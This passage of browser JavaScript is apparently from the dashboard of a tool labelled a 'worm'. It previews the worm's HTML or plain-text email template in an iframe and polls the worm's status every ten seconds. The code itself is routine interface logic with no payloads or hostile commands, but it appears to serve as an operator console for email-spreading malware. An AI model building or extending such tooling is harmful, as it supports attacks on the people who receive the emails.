    content.textContent = 'Loading template...';
    info.textContent = 'Loading...';
    preview.classList.remove('hidden');
    
    try {
        const resp = await fetch('/api/worm/template/preview');
        if (!resp.ok) {
            content.textContent = 'Failed to load template';
            info.textContent = 'Error: ' + resp.statusText;
            return;
        }
        
        const data = await resp.json();
        if (!data.success) {
            content.textContent = 'Failed to load: ' + (data.error || 'unknown');
            info.textContent = 'Error loading template';
            return;
        }
        
        const template = data.html_template || data.txt_template || 'No template available';
        const templateType = data.template_type === 'html' ? '📧 HTML Email' : '📄 Plain Text';
        const customStatus = data.has_custom_templates ? '✅ Using custom templates' : '⚠️ Using default template';
        info.textContent = `${templateType} | ${customStatus} | Size: ${template.length} bytes`;

        const renderArea = document.getElementById('wormTemplateRendered');
        const iframe = document.getElementById('wormTemplateIframe');
        const codeWrapper = document.getElementById('wormTemplateCodeWrapper');
        const truncated = template.length > 1000 ? template.substring(0, 1000) + '\n\n... [truncated]' : template;

        if (data.template_type === 'html' && data.html_template) {
            renderArea.classList.remove('hidden');
            renderArea.style.display = 'block';
            iframe.style.display = 'block';
            try {
                iframe.srcdoc = template;
            } catch (err) {
                const blob = new Blob([template], { type: 'text/html' });
                iframe.src = URL.createObjectURL(blob);
            }
            codeWrapper.classList.add('hidden');
            codeWrapper.style.display = 'none';
            content.textContent = '';
        } else {
            renderArea.classList.add('hidden');
            renderArea.style.display = 'none';
            iframe.style.display = 'none';
            iframe.srcdoc = '';
            codeWrapper.classList.remove('hidden');
            codeWrapper.style.display = 'block';
            content.textContent = template;
        }
    } catch (e) {
        content.textContent = 'Error: ' + e.message;
        info.textContent = 'Exception while loading';
    }
}

async function showWormDetails() {
    openSettingsModal();
    switchTab('wormTab');
    checkWormStatus();
}

// ==================== REAL-TIME STATUS POLLING ====================
let statusPollingInterval = null;

function startStatusPolling() {
    // Poll every 10 seconds
    statusPollingInterval = setInterval(() => {
        checkWormStatus();
    }, 10000);
    // Initial check
    checkWormStatus();
}

function stopStatusPolling() {
    if (statusPollingInterval) {
        clearInterval(statusPollingInterval);
        statusPollingInterval = null;
    }
}

// Start polling on page load
document.addEventListener('DOMContentLoaded', () => {
    startStatusPolling();
});